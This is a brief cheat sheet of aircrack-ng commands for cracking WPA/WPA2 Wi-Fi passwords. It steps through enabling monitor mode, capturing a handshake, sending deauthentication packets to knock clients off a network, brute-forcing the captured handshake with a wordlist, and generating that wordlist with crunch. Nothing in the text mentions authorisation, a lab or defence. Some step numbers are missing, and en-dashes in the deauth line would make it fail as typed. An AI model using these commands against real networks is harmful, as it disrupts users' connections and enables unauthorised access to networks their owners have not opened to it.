1. airmon-ng
2. airmon-ng start wlan0 	// start wlan
3. airodump-ng wlan0mon		// list of wifi
4. airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
5. aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0	
   // Deauth, 2 is number of packets send
6. After handshake stop process and then
7. aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap




11. airmon-ng stop wlan0mon
    service network-manager restart

12. crunch <min-length> <max-length> [<charset strings>] [options]
    -o /root/wlist.txt  

this will capture the handshake of wpa/wpa2 and by brute force you
may get the wifi password
